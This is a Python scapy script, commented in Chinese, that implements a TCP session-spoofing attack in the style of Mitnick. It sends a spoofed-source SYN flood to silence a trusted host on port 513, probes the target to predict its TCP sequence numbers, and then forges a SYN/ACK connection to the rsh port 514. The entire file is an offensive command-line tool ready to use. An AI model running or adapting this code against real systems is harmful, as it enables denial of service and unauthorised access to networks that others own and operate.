# coding=UTF-8
import optparse
from scapy.all import *
from scapy.layers.inet import *


#SYN洪水攻击
def synFlood(src,tgt):
    for sport in range(1024,65535):
        IPlayer = IP(src=src,dst=tgt)
        TCPlayer = TCP(sport = sport,dport=513)
        pkt = IPlayer/TCPlayer
        send(pkt)

#预测TCP序列号
def calTSN(tgt):
    seqNum = 0
    preNum = 0
    diffSeq = 0
    for x in range(1,5):
        if preNum!=0:
            preNum =seqNum
        pkt = IP(dst=tgt)/TCP()
        ans = sr1(pkt,verbose=0)
        seqNum = ans.getlayer(TCP).seq
        diffSeq = seqNum-preNum
        print('[+] TCP Seq Differnece:' + str(diffSeq))
    return seqNum + diffSeq

#发送ACk欺骗包
def spoofConn(src,tgt,ack):
    IPlayer = IP(src=src,dst=tgt)
    TCPlayer = TCP(sport=513,dport=514)
    synPkt = IPlayer/TCPlayer
    send(synPkt)
    IPlayer = IP(src=src,dst=tgt)
    TCPlayer = TCP(sport=513,dport=514,ack=ack)
    ackPkt = IPlayer/TCPlayer
    send(ackPkt)

def main():
    parser = optparse.OptionParser('usage%prog -s<src for SYNFlood> '
                                   '-S <src for spoofed connection> -t<target address>')
    parser.add_option('-s',dest='synSpoof',type='string',help='specify src for SYNFlood')
    parser.add_option('-S',dest='srcSpoof',type='string',help='specify src for spoofed connection')
    parser.add_option('-t',dest='tgt',type='string',help='specify target address')
    (options,args) = parser.parse_args()
    if options.synSpoof == None or options.srcSpoof == None or options.tgt == None:
        print(parser.usage)
        exit(0)
    else:
        synSpoof = options.synSpoof
        srcSpoof = options.srcSpoof
        tgt =options.tgt
    print('[+] Starting SYN Flood to suppress remote server.')
    synFlood(synSpoof,srcSpoof)
    print('[+] Calculating correct TCP Sequence Number.')
    seqNum = calTSN(tgt) + 1
    print('[+] Spoofing Connection.')
    spoofConn(srcSpoof,tgt,seqNum)
    print('[+] Done.')

if __name__ == '__main__':
    main()




